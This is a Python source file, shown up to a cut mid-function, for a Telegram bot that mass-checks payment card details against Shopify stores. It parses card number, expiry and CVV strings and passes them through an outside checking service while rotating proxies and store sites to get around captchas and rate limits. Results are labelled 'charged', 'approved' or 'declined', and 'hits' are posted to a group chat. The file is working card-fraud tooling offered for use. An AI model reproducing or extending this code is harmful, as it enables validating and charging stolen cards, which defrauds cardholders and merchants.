import requests
import re
import random
import logging
from datetime import datetime, timedelta
from typing import Dict, Optional, Tuple, List
import asyncio
import aiohttp
import json
import io
import time
import uuid
import string
from bin import get_bin_info  # Import get_bin_info function from bin.py
from database import get_or_create_user, update_user_credits, get_user_credits  # Import database functions
from plans import get_user_current_tier # Import correct function for tier checking
from proxy import get_random_user_proxy, get_user_proxies  # Import proxy functions
from seturl import get_user_sites  # Import get_user_sites function from seturl.py
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import CallbackContext, Updater, CommandHandler, CallbackQueryHandler

# Configure logging with detailed output for debugging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("mass_checker.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# New API endpoint
API_BASE_URL = "http://autosh.nikhilkhokhar.com/shopify"

# Group IDs for hit detection notifications
HIT_DETECTION_GROUP_ID = -1003838614236

# --- ANTI-FLOOD CONTROLS ---
# Limit concurrent sends to public groups to prevent Telegram ban
# Allow only 2 simultaneous messages to groups to be extremely safe
group_send_limiter = asyncio.Semaphore(2)

# --- GLOBAL STATE ---
# Dictionary to store active mass check processes
active_mass_checks = {}
# Dictionary to track pending mass check confirmations
pending_mass_checks = {}
# Dictionary to track problematic sites (r4 token empty)
problematic_sites = {
    "r4_token_empty": [],  # Sites returning "r4 token empty" error
    "item_response": [],   # Sites returning "item" in response
    "proxy_errors": [],   # Sites with proxy errors
    "host_errors": [],    # Sites with host resolution errors
    "last_reset": time.time()  # Timestamp of last reset
}

# Error messages that trigger a retry with another site
RETRY_ERRORS = [
    'r4 token empty',
    'Payment method is not shopify!',
    'r2 id empty',
    'product not found',    
    'hcaptcha detected',
    'tax ammount empty',
    'del ammount empty',
    'product id is empty',
    'py id empty',
    'clinte token',
    'HCAPTCHA_DETECTED',
    'RECEIPT_EMPTY',
    'NA',
    'Site Error! Status: 429',
    'Site requires login!',
    'Failed to get token',
    'Failed to get token',
    'No Valid Products',
    'Not Shopify!',
    'Site Error! Status: 404',
    'Site Error! Status: 401',
    'Site Error! Status: 402',
    'Failed to get checkout',
    'Captcha at Checkout - Use good proxies!',
    'Payment method is not shopify!',
    'Site not supported for now!',
    'Connection error',
    'Connection Error!',
    'Error processing card',
    '504',
    'server error',
    'client error',
    'failed',
    'AMOUNT_TOO_SMALL',
    'Change Proxy or Site',
    'receipt_empty',
    'amount_too_small',
    'HCAPTCHA_DETECTED',
    'Token Not Found',
    'INVALID_RESPONSE',
    'resolve',
    
    'item',  # Added 'item' to trigger site rotation
    'cURL error',  # Added cURL errors
    'Could not resolve host',  # Added host resolution errors
    'CONNECT tunnel failed',  # Added proxy tunnel errors
]

def generate_session_id(length=8):
    """Generate a random session ID."""
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

def luhn_check(card_number: str) -> bool:
    """
    Validate a card number using Luhn algorithm.
    
    Args:
        card_number: The card number to validate
        
    Returns:
        True if card number is valid, False otherwise
    """
    # Remove any non-digit characters
    card_number = re.sub(r'\D', '', card_number)
    
    # Check if card number contains only digits and has a valid length
    if not card_number.isdigit() or len(card_number) < 13 or len(card_number) > 19:
        return False
    
    # Convert to list of integers
    digits = [int(d) for d in card_number]
    
    # Double every second digit from right
    for i in range(len(digits) - 2, -1, -2):
        digits[i] *= 2
        if digits[i] > 9:
            digits[i] -= 9
    
    # Sum all digits
    total = sum(digits)
    
    # Check if sum is divisible by 10
    return total % 10 == 0

def reset_problematic_sites():
    """Reset problematic sites list if it's been more than 30 minutes."""
    current_time = time.time()
    if current_time - problematic_sites["last_reset"] > 1800:  # 30 minutes
        problematic_sites["r4_token_empty"] = []
        problematic_sites["item_response"] = []
        problematic_sites["proxy_errors"] = []
        problematic_sites["host_errors"] = []
        problematic_sites["last_reset"] = current_time
        logger.info("Reset problematic sites list")

def get_random_site(user_id: int) -> str:
    """
    Get a random site for user, excluding problematic ones.
    
    Args:
        user_id: ID of the user
        
    Returns:
        Random site URL
    """
    # Reset problematic sites if needed
    reset_problematic_sites()
    
    # Get user sites
    user_sites = get_user_sites(user_id)
    
    # If user has no sites, return None (will be handled by caller)
    if not user_sites:
        logger.warning(f"User {user_id} has no sites configured")
        return None
    
    # Filter out sites with known errors
    available_sites = [site for site in user_sites 
                      if site not in problematic_sites["r4_token_empty"] 
                      and site not in problematic_sites["item_response"]
                      and site not in problematic_sites["proxy_errors"]
                      and site not in problematic_sites["host_errors"]]
    
    # If all sites are problematic, reset the list and use all sites
    if not available_sites:
        logger.warning("All sites are marked as problematic, resetting list")
        problematic_sites["r4_token_empty"] = []
        problematic_sites["item_response"] = []
        problematic_sites["proxy_errors"] = []
        problematic_sites["host_errors"] = []
        available_sites = user_sites
    
    return random.choice(available_sites)

def mark_problematic_site(site: str, error_type: str):
    """Mark a site as problematic based on error type."""
    if error_type == "r4 token empty" and site not in problematic_sites["r4_token_empty"]:
        problematic_sites["r4_token_empty"].append(site)
        logger.warning(f"Marked site as problematic for 'r4 token empty': {site}")
    elif error_type == "item" and site not in problematic_sites["item_response"]:
        problematic_sites["item_response"].append(site)
        logger.warning(f"Marked site as problematic for 'item' response: {site}")
    elif error_type == "proxy" and site not in problematic_sites["proxy_errors"]:
        problematic_sites["proxy_errors"].append(site)
        logger.warning(f"Marked site as problematic for proxy errors: {site}")
    elif error_type == "host" and site not in problematic_sites["host_errors"]:
        problematic_sites["host_errors"].append(site)
        logger.warning(f"Marked site as problematic for host errors: {site}")

def is_retry_error(response_text: str) -> Tuple[bool, str]:
    """
    Check if response text contains any retry error and identify error type.
    IMPROVEMENT: Strips HTML tags before checking for errors to be more robust.
    CHANGE: Now treats "Error processing card" as a final declined response, not a retryable error.
    CHANGE: Now treats "CAPTCHA_REQUIRED" as a declined response, not a retryable error.
    
    Args:
        response_text: The response text to check
        
    Returns:
        Tuple of (is_retry_error, error_type)
    """
    # Strip HTML tags from response text before checking for errors
    # This handles cases like '<b>Error processing card</b>' correctly
    clean_text = re.sub(r'<[^>]+>', '', response_text)
    response_text_lower = clean_text.lower()
    
    # Check if this is "Error processing card" - treat as declined, not a retry error
    if "error processing card" in response_text_lower:
        return False, "declined"
    
    # Check if this is "CAPTCHA_REQUIRED" - treat as declined, not a retry error
    if "captcha_required" in response_text_lower or "captcha required" in response_text_lower:
        return False, "declined"
    
    for error in RETRY_ERRORS:
        if error.lower() in response_text_lower:
            # Determine error type for tracking
            if "cURL error" in response_text_lower and "CONNECT tunnel failed" in response_text_lower:
                return True, "proxy"
            elif "Could not resolve host" in response_text_lower:
                return True, "host"
            elif error.lower() == "r4 token empty":
                return True, "r4 token empty"
            elif error.lower() == "item":
                return True, "item"
            else:
                return True, "other"
    return False, ""

async def check_single_card(card_details: str, user_info: Dict, user_proxies: List[str], 
                         proxy_index: int = 0, max_retries: int = 25, 
                         stop_event: asyncio.Event = None, session_id: str = None) -> Dict:
    """
    Check a single card using Shopify API with retry logic (pure async version).
    Continues retrying until a valid response is received or max_retries is reached.
    
    Args:
        card_details: String containing card details in various formats
        user_info: Dictionary containing user information
        user_proxies: List of user's proxies
        proxy_index: Index of proxy to use (for rotation)
        max_retries: Maximum number of retries with different sites
        stop_event: Event to signal when to stop checking
        session_id: Session ID for this mass check process
        
    Returns:
        Dictionary with API response and site used
    """
    # Parse card details
    parsed = parse_card_details(card_details)
    if not parsed:
        return {
            "success": False,
            "error": "Invalid card format",
            "card": card_details,
            "is_proxy_error": False
        }
    
    card_number, month, year, cvv = parsed
    user_id = user_info.get("id")
    
    # Check if card number is valid using Luhn algorithm
    if not luhn_check(card_number):
        return {
            "success": False,
            "error": "Invalid card number (failed Luhn check)",
            "card": card_details,
            "is_proxy_error": False,
            "is_luhn_failed": True
        }
    
    # Get BIN information using imported function
    try:
        bin_details = await get_bin_info(card_number[:6])
    except Exception as e:
        bin_details = {}
    
    brand = (bin_details.get("scheme") or "N/A").title()
    issuer = bin_details.get("bank") or "N/A"
    country_name = bin_details.get("country") or "Unknown"
    country_flag = bin_details.get("country_emoji", "")
    
    # Check if stopped before starting - IMMEDIATE CHECK
    if stop_event and stop_event.is_set():
        return {
            "success": False,
            "error": "Process stopped by user",
            "card": card_details,
            "is_proxy_error": False
        }
    
    # Get a proxy from user's list using the provided index
    if not user_proxies:
        logger.error(f"No proxy found for user {user_id}")
        return {
            "success": False,
            "error": "No proxy found. Please add a proxy using /proxy command.",
            "card": card_details,
            "is_proxy_error": True
        }
    
    # Track used sites to avoid repetition
    used_sites = set()
    
    # Try up to max_retries times with different sites
    for attempt in range(max_retries):
        # Check if user has requested to stop - check more frequently
        if stop_event and stop_event.is_set():
            return {
                "success": False,
                "error": "Process stopped by user",
                "card": card_details,
                "is_proxy_error": False
            }
        
        # Get a random site for each attempt, avoiding problematic sites
        site = get_random_site(user_id)
        
        # If no sites available, return error
        if site is None:
            return {
                "success": False,
                "error": "No sites configured. Please add sites using /seturl command.",
                "card": card_details,
                "is_proxy_error": False
            }
        
        # Skip if we've already used this site
        if site in used_sites:
            continue
        
        used_sites.add(site)
        
        # Rotate proxy for each retry attempt - ensure we're rotating properly
        # Use a global proxy counter to ensure proper rotation across all cards
        global_proxy_index = proxy_index + attempt
        proxy = user_proxies[global_proxy_index % len(user_proxies)]
        
        # Remove http:// or https:// from proxy if present
        if proxy.startswith("http://"):
            proxy = proxy[7:]
        elif proxy.startswith("https://"):
            proxy = proxy[8:]
        
        # Prepare API URL with query parameters
        api_url = f"{API_BASE_URL}?site={site}&cc={card_number}|{month}|{year}|{cvv}&proxy={proxy}"
        
        # Logging removed for console cleanliness
        
        try:
            # Add 0.2 second delay before each request
            await asyncio.sleep(0.3)
            
            # Use aiohttp for async HTTP request with timeout
            timeout = aiohttp.ClientTimeout(total=60)  # Increased timeout
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(api_url) as response:
                    if response.status >= 500:
                        continue
                    
                    api_response = await response.json()
                    
                    # Check if we got a valid response (not a retry error)
                    response_text = api_response.get("Response", "")
                    
                    # Check for specific error messages that should trigger retry
                    is_retry, error_type = is_retry_error(response_text)
                    
                    # If it's "Error processing card", treat as declined and return immediately
                    if error_type == "declined":
                        return {
                            "success": True,
                            "api_response": api_response,
                            "site": site,
                            "card": card_details,
                            "brand": brand,
                            "issuer": issuer,
                            "country": country_name,
                            "country_flag": country_flag,
                            "is_proxy_error": False,
                            "proxy_status": api_response.get("Proxy", "Unknown")
                        }
                    
                    if is_retry:
                        # Mark site as problematic based on error type
                        mark_problematic_site(site, error_type)
                        continue
                    
                    # Check if price is above $150, if so, retry with another site
                    price = api_response.get("Price", "0")
                    try:
                        price_value = float(price.replace("$", ""))
                        if price_value > 150:
                            continue  # Skip this site and try another
                    except (ValueError, AttributeError):
                        # If we can't parse price, continue with this response
                        pass
                    
                    # If we get here, we have a valid response
                    # Get proxy status from response
                    proxy_status = api_response.get("Proxy", "Unknown")
                    
                    return {
                        "success": True,
                        "api_response": api_response,
                        "site": site,
                        "card": card_details,
                        "brand": brand,
                        "issuer": issuer,
                        "country": country_name,
                        "country_flag": country_flag,
                        "is_proxy_error": False,
                        "proxy_status": proxy_status
                    }
        
        except asyncio.TimeoutError:
            continue
        except aiohttp.ClientError:
            continue
        except ValueError:
            continue
        except Exception:
            continue
    
    # If we get here, all retries failed - count as error instead of declined
    return {
        "success": False,
        "error": "All retries failed",
        "card": card_details,
        "is_proxy_error": False
    }

def parse_card_details(card_string: str) -> Optional[Tuple[str, str, str, str]]:
    """
    Parse card details from various formats.
    
    Args:
        card_string: String containing card details in various formats
        
    Returns:
        Tuple of (card_number, month, year, cvv) or None if parsing failed
    """
    # Remove any extra spaces
    card_string = card_string.strip()
    
    # Try different patterns
    patterns = [
        # Pattern: 429619000071410|08|30|545
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 429619000071410/08/30/545
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 429619000071410:08:30:545
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 42961900071410 08 30 545
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
    ]
    
    for pattern in patterns:
        match = re.match(pattern, card_string)
        if match:
            card_number, month, year, cvv = match.groups()
            
            # Normalize month (ensure it's 2 digits)
            month = month.zfill(2)
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
            
            return card_number, month, year, cvv
    
    return None

def format_mass_response(result: Dict, user_info: Dict) -> Tuple[str, str]:
    """
    Format API response into a beautiful message with emojis for Shopify.
    
    Args:
        result: Dictionary containing API response
        user_info: Dictionary containing user information
        
    Returns:
        Tuple of (formatted string, status category)
    """
    if not result.get("success"):
        error_msg = result.get('error', 'Unknown error')
        
        # Check if this is a Luhn check failure
        if result.get("is_luhn_failed"):
            formatted_error = f"❌ <i>Declined</i> <code>{result.get('card', 'Unknown')}</code>: Invalid card number (failed Luhn check)"
            return formatted_error, "declined"
        # Check if this is a proxy error
        elif result.get("is_proxy_error"):
            formatted_error = f"⚠️ <i>Proxy Error</i> <code>{result.get('card', 'Unknown')}</code>: {error_msg}"
            return formatted_error, "proxy_error"
        # Check if this is a declined card (after max retries)
        elif error_msg == "card_declined":
            formatted_error = f"❌ <i>Declined</i> <code>{result.get('card', 'Unknown')}</code>: Card declined after maximum retries"
            return formatted_error, "declined"
        else:
            formatted_error = f"⚠️ <i>Error checking card</i> <code>{result.get('card', 'Unknown')}</code>: {error_msg}"
            return formatted_error, "error"
    
    api_response = result.get("api_response", {})
    card_details = result.get("card", "")
    brand = result.get("brand", "N/A")
    issuer = result.get("issuer", "N/A")
    country_name = result.get("country", "Unknown")
    country_flag = result.get("country_flag", "")
    site = result.get("site", "")
    proxy_status = result.get("proxy_status", "Unknown")
    
    response_text = api_response.get("Response", "N/A")
    gateway = api_response.get("Gateway", "N/A")
    price = api_response.get("Price", "N/A")
    status = api_response.get("Status", False)
    
    # Parse and clean response message
    response_text = response_text.replace("\\", "").replace("/", "").replace("\"", "").replace("'", "")
    
    # Determine status based on message content with stylish formatting
    status_emoji = "❓"
    status_text = "Unknown"
    status_style = ""
    status_category = "unknown"
    
    # Check for charged messages (ONLY ORDER_PLACED should be considered charged)
    response_text_lower = response_text.lower()
    if "order_paid" in response_text_lower:
        status_emoji = "🔥"
        status_text = "Charged"
        status_style = "𝘾𝙝𝙖𝙧𝙜𝙚𝙙 🔥"
        status_category = "charged"
    # Check for approved messages (including 3DS_REQUIRED)
    elif any(keyword in response_text_lower for keyword in ["3d_authentication", "insufficient_funds", "incorrect_zip", "3ds_required", "invalid_cvc"]):
        status_emoji = "✅"
        status_text = "Approved"
        status_style = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
        status_category = "approved"
    # Check for declined messages (including "Error processing card", "CAPTCHA_REQUIRED", and "CARD_DECLINED")
    # CHANGE: Added 'error processing card', 'captcha_required', and 'card_declined' to this check to categorize them as "declined"
    elif ("card_declined" in response_text_lower or 
          "generic_error" in response_text_lower or
          "do not honor" in response_text_lower or
          "insufficient funds" in response_text_lower or
          "lost or stolen" in response_text_lower or
          "stolen" in response_text_lower or
          "token" in response_text_lower or
          "unable" in response_text_lower or
          "expired" in response_text_lower or
          "invalid" in response_text_lower or
          "generic" in response_text_lower or
          "incorrect_number" in response_text_lower or
          "unprocessable_transaction" in response_text_lower or
          "error processing card" in response_text_lower or  # This is the key change
          "backbend_high" in response_text_lower or  # Added CAPTCHA_REQUIRED as declined
          "server_overloaded" in response_text_lower):  # Added space variant
        status_emoji = "❌"
        status_text = "Declined"
        status_style = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌"
        status_category = "declined"
    # Default status
    else:
        status_emoji = "❓"
        status_text = "Unknown"
        status_style = f"{status_emoji} 𝙐𝙣...𝙠"
        status_category = "unknown"
    
    # Get user info
    user_id = user_info.get("id", "Unknown")
    username = user_info.get("username", "")
    first_name = user_info.get("first_name", "User")
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Format response with new UI structure
    status_part = f"<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ {status_style}</pre>"
    
    card_part = f"<a href='https://t.me/failfr'>⊀</a> 𝐂𝐚𝐫𝐝\n⤷ <code>{card_details}</code>"
    
    gateway_part = f"<a href='https://t.me/failfr'>⊀</a> 𝐆𝚊𝐭𝐞𝐰𝚊𝐲 ↬ <i><b>{gateway}</b></i>"
    
    response_part = f"<a href='https://t.me/failfr'>⊀</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↬ <b>{response_text}</b>"
    
    price_part = f"<a href='https://t.me/failfr'>⊀</a> 𝐏𝐫𝐢𝐜𝐞 ↬ <b>{price} USD</b>"
    
    bank_part = f"<pre>𝑩𝒓𝒂𝒏𝒌 ↬ <code>{brand}</code>\n𝑩𝒂𝒏𝒌 ↬ <code>{issuer}</code>\n𝑪𝒐𝒖𝒏𝒕𝒓𝒚 ↬ <code>{country_name} {country_flag}</code></pre>"
    
    user_part = f"<a href='https://t.me/failfr'>⌬</a> 𝐔𝐬𝐞𝐫 ↬ <a href='tg://user?id={user_id}'>{first_name}</a> <code>[{user_tier}]</code>"
    
    proxy_emoji = "🟢" if proxy_status.lower() == "live" else "🔴"
    proxy_part = f"<a href='https://t.me/failfr'>⌬</a> 𝐏𝐱 ↬ {proxy_emoji}"    
    
    # Add developer part with hyperlink
    dev_part = f"<a href='https://t.me/failfr'>⌬</a> 𝐃𝐞𝐯 ↬ <a href='https://t.me/failurefr_07'>kคli liຖนxx</a> / {proxy_part}"
    
    # Combine all parts
    formatted_response = f"{status_part}\n{card_part}\n{gateway_part}\n{response_part}\n{price_part}\n{bank_part}\n{user_part}\n{dev_part}"
    
    return formatted_response, status_category

def format_hit_detected_message(result: Dict, user_info: Dict) -> str:
    """
    Format a hit detection message for group chat using UI from second script.
    
    Args:
        result: Dictionary containing API response
        user_info: Dictionary containing user information
        
    Returns:
        Formatted string for hit detection message
    """
    api_response = result.get("api_response", {})
    card_details = result.get("card", "")
    site = result.get("site", "")
    
    response_text = api_response.get("Response", "N/A")
    gateway = api_response.get("Gateway", "N/A")
    price = api_response.get("Price", "N/A")
    
    # Parse and clean response message
    response_text = response_text.replace("\\", "").replace("/", "").replace("\"", "").replace("'", "")
    
    # Get user info
    user_id = user_info.get("id", "Unknown")
    username = user_info.get("username", "")
    first_name = user_info.get("first_name", "User")
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Create user profile link
    user_link = f"<a href='tg://user?id={user_id}'>{first_name}</a> <code>[{user_tier}]</code>"
    
    # Determine status based on message content - ONLY ORDER_PLACED should be considered charged
    response_text_lower = response_text.lower()
    if "order_paid" in response_text_lower:
        status_style = "<b>𝘾𝙝𝙖𝙧𝙜𝙚𝙙</b> 🔥"
    elif any(keyword in response_text_lower for keyword in ["3d_authentication", "invalid_cvc", "insufficient_funds", "incorrect_zip", "3ds_required"]):
        status_style = "<b>𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿</b> ✅"
    else:
        status_style = "<b>𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿</b> ❌"
    
    # Format hit detection message with UI style from second script
    status_part = f"""<pre><a href='https://t.me/failfr'>⩙</a> <b>𝑯𝒊𝒕 𝑫𝒆𝒕𝒄𝒕𝒆𝒅</b> ↬ {status_style}</pre>"""
    
    # Combine all parts
    hit_message = f"""{status_part}
<a href='https://t.me/failfr'>⊀</a> <b>𝐆𝚊𝐭𝐞𝐰𝚊𝐲</b> ↬ <i><b>{gateway}</b></i>
<a href='https://t.me/failfr'>⊀</a> 𝐏𝐫𝐢𝐜𝐞 ↬ <b>{price} USD</b>
<a href='https://t.me/failfr'>⊀</a> <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ↬ <b>{response_text}</b>
<a href='https://t.me/failfr'>⌬</a> <b>𝐔𝐬𝐞𝐫 ↬</b> ↬ {user_link} 
<a href='https://t.me/failfr'>⌬</a> <b>𝐇𝐢𝐭 𝐅𝐫𝐨𝐦</b> ↬ <a href='https://t.me/CARDXCK_BOT'>𝑪𝑨𝑹𝑫 ✘ 𝑪𝑯𝑲</a>"""
    
    return hit_message

def format_progress_response(stats: Dict, user_id: int, session_id: str) -> Tuple[str, InlineKeyboardMarkup]:
    """
    Format progress message with statistics.
    
    Args:
        stats: Dictionary containing statistics
        user_id: ID of the user
        session_id: Session ID for this mass check process
        
    Returns:
        Tuple of (formatted string, inline keyboard markup)
    """
    # Calculate percentage
    percentage = int((stats["checked"] / stats["total"]) * 100) if stats["total"] > 0 else 0
    
    # Create progress message with exact format requested (gateway added above total cards)
    progress_msg = f"""<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ 𝙋𝙧𝙤𝙘𝙨𝙨𝞟𝙣𝙜 📊</pre>
<a href='https://t.me/failfr'>⊀</a> 𝐒𝐞𝐬𝐬𝐢𝐨𝐧 𝐈𝐃 ↬ <code>{session_id}</code>
<a href='https://t.me/failfr'>⊀</a> 𝐆𝚊𝐭𝐞𝐰𝚊𝐲 ↬ Shopify Rnd. Charge
<a href='https://t.me/failfr'>⊀</a> 𝐓𝐨𝐭𝐚𝐥 𝐂𝐚𝐫𝐝𝐬 ↬ <code>{stats["total"]}</code>
<a href='https://t.me/failfr'>⊀</a> 𝐂𝐡𝐞𝐜𝐤𝐝 ↬ <code>{stats["checked"]}/{stats["total"]} ({percentage}%)</code>
<a href='https://t.me/failfr'>⊀</a> 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥 ↬ <code>{stats["charged"]}</code>
<a href='https://t.me/failfr'>⊀</a> 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅ ↬ <code>{stats["approved"]}</code>
<a href='https://t.me/failfr'>⊀</a> 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ ↬ <code>{stats["declined"]}</code>
<a href='https://t.me/failfr'>⊀</a> 𝐄𝐫𝐫𝐨𝐫 𝐂𝚊𝐫𝐝𝐬 ⚠️ ↬ <code>{stats["error"]}</code>
<a href='https://t.me/failfr'>⌬</a> 𝐒𝐭𝐨𝐩 𝐂𝐨𝐦𝐚𝐧𝐝 ↬ <code>/stop {session_id}</code>
<a href='https://t.me/failfr'>⌬</a> 𝐃𝐞𝐯 ↬ <a href='https://t.me/failurefr_07'>kคli liຖนxx</a>"""
    
    # No inline keyboard needed since we're using /stop command
    reply_markup = None
    
    return progress_msg, reply_markup

def format_stopped_response(stats: Dict, elapsed_time: float, user_name: str, session_id: str) -> str:
    """
    Format stopped message with statistics (without stop button).
    
    Args:
        stats: Dictionary containing statistics
        elapsed_time: Time elapsed in seconds
        user_name: Name of the user
        session_id: Session ID for this mass check process
        
    Returns:
        Formatted string with stopped statistics
    """
    # Create stopped message with exact format requested (gateway added above total cards)
    stopped_msg = f"""<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ 𝙎𝙩𝙤𝙥𝙥𝙚𝙙 ⏹️</pre>
<a href='https://t.me/failfr'>⊀</a> 𝐒𝐞𝐬𝐬𝐢𝐨𝐧 𝐈𝐃 ↬ <code>{session_id}</code>
<a href='https://t.me/failfr'>⊀</a> 𝐆𝚊𝐭𝐞𝐰𝚊𝐲 ↬ Shopify Rnd. Charge
<a href='https://t.me/failfr'>⊀</a> 𝐓𝐨𝐭𝐚𝐥 𝐂𝐚𝐫𝐝𝐬 ↬ <code>{stats["total"]}</code>
<a href='https://t.me/failfr'>⊀</a> 𝐂𝐡𝐞𝐜𝐤𝐝 ↬ <code>{stats["checked"]}/{stats["total"]}</code>
<a href='https://t.me/failfr'>⊀</a> 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥 ↬ <code>{stats["charged"]}</code>
<a href='https://t.me/failfr'>⊀</a> 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅ ↬ <code>{stats["approved"]}</code>
<a href='https://t.me/failfr'>⊀</a> 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ ↬ <code>{stats["declined"]}</code>
<a href='https://t.me/failfr'>⊀</a> 𝐄𝐫𝐫𝐨𝐫 𝐂𝚊𝐫𝐝𝐬 ⚠️ ↬ <code>{stats["error"]}</code>
<a href='https://t.me/failfr'>⊀</a> 𝐓𝐢𝐦𝐞 ↬ <code>{elapsed_time}s</code> ⏱️
<a href='https://t.me/failfr'>⊀</a> 𝐂𝐡𝐞𝐜𝐤 𝐁𝐲 ↬ <code>{user_name}</code>
<a href='https://t.me/failfr'>⌬</a> 𝐃𝐞𝐯 ↬ <a href='https://t.me/failurefr_07'>kคli liຖนxx</a>"""
    
    return stopped_msg

def format_final_response(stats: Dict, elapsed_time: float, user_name: str, stopped: bool = False, session_id: str = None) -> str:
    """
    Format final results message with statistics.
    
    Args:
        stats: Dictionary containing statistics
        elapsed_time: Time elapsed in seconds
        user_name: Name of the user
        stopped: Whether the process was stopped by the user
        session_id: Session ID for this mass check process
        
    Returns:
        Formatted string with final statistics
    """
    # Create final message with exact format requested (gateway added above total cards)
    if stopped:
        status_text = "𝙎𝙩𝙤𝙥𝙥𝙚𝙙 ⏹️"
        header_text = "𝑺𝒕𝒂𝒕𝒖𝒔"
    else:
        status_text = "𝙁𝙞𝙣𝙖𝙡 𝙎𝙩𝙖𝙩𝙪𝙨 ✅"
        header_text = "𝑺𝐮𝐦𝐦𝐚𝐫𝐲"
    
    final_msg = f"""<pre>⩙ {header_text} ↬ {status_text}</pre>
<a href='https://t.me/failfr'>⊀</a> 𝐒𝐞𝐬𝐬𝐢𝐨𝐧 𝐈𝐃 ↬ <code>{session_id if session_id else 'N/A'}</code>
<a href='https://t.me/failfr'>⊀</a> 𝐆𝚊𝐭𝐞𝐰𝚊𝐲 ↬ Shopify Rnd. Charge
<a href='https://t.me/failfr'>⊀</a> 𝐓𝐨𝐭𝐚𝐥 𝐂𝐚𝐫𝐝𝐬 ↬ <code>{stats["total"]}</code>
<a href='https://t.me/failfr'>⊀</a> 𝐂𝐡𝐞𝐜𝐤𝐝 ↬ <code>{stats["checked"]}/{stats["total"]}</code>
<a href='https://t.me/failfr'>⊀</a> 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥 ↬ <code>{stats["charged"]}</code>
<a href='https://t.me/failfr'>⊀</a> 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅ ↬ <code>{stats["approved"]}</code>
<a href='https://t.me/failfr'>⊀</a> 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ ↬ <code>{stats["declined"]}</code>
<a href='https://t.me/failfr'>⊀</a> 𝐄𝐫𝐫𝐨𝐫 𝐂𝚊𝐫𝐝𝐬 ⚠️ ↬ <code>{stats["error"]}</code>
<a href='https://t.me/failfr'>⊀</a> 𝐓𝐢𝐦𝐞 ↬ <code>{elapsed_time}s</code> ⏱️
<a href='https://t.me/failfr'>⊀</a> 𝐂𝐡𝐞𝐜𝐤 𝐁𝐲 ↬ <code>{user_name}</code>
<a href='https://t.me/failfr'>⌬</a> 𝐃𝐞𝐯 ↬ <a href='https://t.me/failurefr_07'>kคli liຖนxx</a>"""
    
    return final_msg

def extract_urls_from_text(text: str) -> List[str]:
    """
    Extract all URLs from a text using regex.
    
    Args:
        text: Text to extract URLs from
        
    Returns:
        List of URLs found in the text
    """
    # Regex pattern to match URLs
    url_pattern = r'https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+[^\s]*'
    urls = re.findall(url_pattern, text)
    
    # Clean up URLs and remove trailing punctuation
    cleaned_urls = []
    for url in urls:
        # Remove trailing punctuation
        url = url.rstrip('.,;:!?)')
        # Ensure it's a valid URL
        if url.startswith(('http://', 'https://')):
            cleaned_urls.append(url)
    
    return cleaned_urls

# --- HELPER FUNCTIONS FOR FLOOD CONTROL ---

async def send_with_retry(bot, chat_id, text, retries=2, delay=2):
    """Send a message with retry logic to handle temporary floods."""
    for attempt in range(retries):
        try:
            return await bot.send_message(
                chat_id=chat_id,
                text=text,
                parse_mode="HTML",
                disable_web_page_preview=True
            )
        except Exception as e:
            error_str = str(e).lower()
            if "flood" in error_str or "too many requests" in error_str:
                if attempt < retries - 1:
                    wait_time = delay * (attempt + 1)
                    logger.warning(f"Flood control detected for {chat_id}. Waiting {wait_time}s before retry {attempt+1}/{retries}")
                    await asyncio.sleep(wait_time)
                else:
                    logger.error(f"Failed to send to {chat_id} after {retries} retries due to flood.")
            else:
                # If not a flood error, raise immediately
                logger.error(f"Non-flood error sending to {chat_id}: {e}")
                raise
    return None

async def process_single_card(card: str, user_info: Dict, stats: Dict, 
                             context, update, user_id: int, stop_event: asyncio.Event, 
                             message_id: int, chat_id: int, proxy_index: int, session_id: str, include_approved: bool):
    """
    Process a single card with proper error handling and immediate stop functionality.
    OPTIMIZED: Added flood control for group messages and throttled progress updates.
    
    Args:
        card: Card details to check
        user_info: Dictionary containing user information
        stats: Dictionary containing statistics
        context: Telegram context object
        update: Telegram update object
        user_id: ID of the user
        stop_event: Event to signal when to stop checking
        message_id: ID of the progress message to update
        chat_id: ID of the chat to send messages to
        proxy_index: Index of proxy to use for this card
        session_id: Session ID for this mass check process
        include_approved: Whether to include approved cards in results
    """
    # Check if process has been stopped - IMMEDIATE CHECK
    if stop_event.is_set():
        return
    
    # Get user proxies from database directly
    user_proxies = get_user_proxies(user_info.get("id"))
    
    # Check if user has proxies
    if not user_proxies:
        logger.error(f"No proxy found for user {user_info.get('id')}")
